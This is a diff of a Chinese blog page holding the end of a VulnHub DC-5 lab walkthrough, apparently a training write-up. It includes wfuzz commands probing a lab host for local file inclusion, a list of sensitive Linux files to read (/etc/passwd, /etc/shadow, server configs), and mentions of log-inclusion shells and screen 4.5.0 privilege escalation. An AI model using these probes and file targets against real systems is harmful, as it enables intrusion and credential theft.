+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>文件包含参数与linux可用私密文件爆破【字典特别重要，github的一些star很多的项目也不够，以后要持续收集、wfuzz和burp都好用】、通过包含日志文件getshell、suid提权-screen 4.5.0 </p>
+<h4 id="本次实验中使用wfuzz的一次失败经历"><a href="#本次实验中使用wfuzz的一次失败经历" class="headerlink" title="本次实验中使用wfuzz的一次失败经历"></a>本次实验中使用wfuzz的一次失败经历</h4><p>使用wfuzz【Web安全模糊测试工具】测试一下页面，失败了。用kali自带工具wfuzz（自带字典）扫描文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/wfuzz/general/test.txt http://192.168.124.135/FUZZ.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646920962465.png" alt="1646920962465"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/wfuzz/general/test.txt http://192.168.124.135/FUZZ.php</span><br></pre></td></tr></table></figure>
+
+<p>如果确定了它存在本地文件包含！可以继续用wfuzz 缩小我们得到的参数范围：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz   -w /usr/share/wfuzz/wordlist/general/lfi1.txt -w /usr/share/wfuzz/wordlist/lfi.txt  http://192.168.124.135/thankyou.php?FUZZ=FUZ2Z</span><br><span class="line">-w可以指定多个有效载荷</span><br></pre></td></tr></table></figure>
+
+<p>kali的默认字典【user&#x2F;share&#x2F;wfuzz&#x2F;wordlist】里面没有lfi【本地文件包含的】的字典<img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646921763847.png" alt="1646921763847"></p>
+<p>网上找了一个lfi字典给kali用用</p>
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646922440355.png" alt="1646922440355"></p>
+<p>好吧真不行，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz   -w /usr/share/wfuzz/wordlist/general/lfi1.txt -w /usr/share/wfuzz/wordlist/lfi.txt  http://192.168.124.135/thankyou.php?FUZZ=FUZ2Z</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646924907359.png" alt="1646924907359"></p>
+<p>github自带的fuzz字典不行呀，网上暂时也没搜到什么。</p>
+<h4 id="额外知识："><a href="#额外知识：" class="headerlink" title="额外知识："></a>额外知识：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux/Unix系统常见的敏感信息路径：</span><br><span class="line">/etc/passwd // 账户信息</span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/highgerms/Picture_blog_highgerms@main/1646920123878.png" alt="1646920123878"></p>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p>VulnHub通关日记-DC_5-Walkthrough                【<strong>Gcow安全团队</strong>】</p>
+<p>打靶系列之-DC-5      【<strong>零度安全攻防实验室</strong>】          </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gramdog/article/details/80374119">https://blog.csdn.net/gramdog/article/details/80374119</a>  【Shell中 2&gt;&#x2F;dev&#x2F;null】</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Wu000999/article/details/101796673">https://blog.csdn.net/Wu000999/article/details/101796673</a> 【常用的php一句话木马格式】</p>
 
                 
             </div>
@@ -460,7 +571,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/">http://highgerms.github.io/2022/07/19/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%87%8D%E5%AE%9A%E5%90%91/</a>
+                    <a href="http://highgerms.github.io/2022/03/14/dc-5/">http://highgerms.github.io/2022/03/14/dc-5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -498,8 +609,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%90%88%E8%A7%84%E5%9F%BA%E7%BA%BF%E7%9B%B8%E5%85%B3/">
-                                    <span class="chip bg-color">合规基线相关</span>
+                                <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">DC系列靶机</span>
                                 </a>
                             
                         </div>
@@ -549,31 +660,30 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/07/25/WIN+R%20%20%E5%AE%9E%E7%94%A8%E5%A4%A7%E6%80%BB%E7%BB%93/">
+                <a href="/2022/03/15/dc-6/">
                     <div class="card-image">
                         
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-6 【DC系列】">
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="WIN+R实用大总结">
-                        
-                        <span class="card-title">WIN+R实用大总结</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-6 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            将Windows的各种快捷键记熟会提高效率，我们cmd命令都运行结束了，有些傻孩子都还在找图形化界面入口。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-6，包含了wordpress后台插件命令注入拿shell、nmap高版本提权获取root等知识。
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-25
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/" class="post-category">
-                                    效率提升技巧
+                            <a href="/categories/%E4%BB%BF%E7%9C%9F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" class="post-category">
+                                    仿真靶机渗透
                                 </a>
                             
                             
@@ -583,8 +693,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%95%88%E7%8E%87%E6%8F%90%E5%8D%87%E6%8A%80%E5%B7%A7/">
-                        <span class="chip bg-color">效率提升技巧</span>
+                    <a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">DC系列靶机</span>
                     </a>
                     
                 </div>
@@ -598,23 +708,23 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/15/dc-8/">
+                <a href="/2022/03/08/dc-4/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-8 【DC系列】">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub仿真靶机渗透之DC-4 【DC系列】">
                         
-                        <span class="card-title">VulnHub仿真靶机渗透之DC-8 【DC系列】</span>
+                        <span class="card-title">VulnHub仿真靶机渗透之DC-4 【DC系列】</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-8，包含了sql注入、suid-exim4提权等知识。
+                            这次渗透是DC系列（VulnHub的仿真靶机）的DC-4，包含了nc反弹shell、hydra爆破ssh 、teehee权限提升等知识。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-08
                             </span>
                         <span class="publish-author">
                             
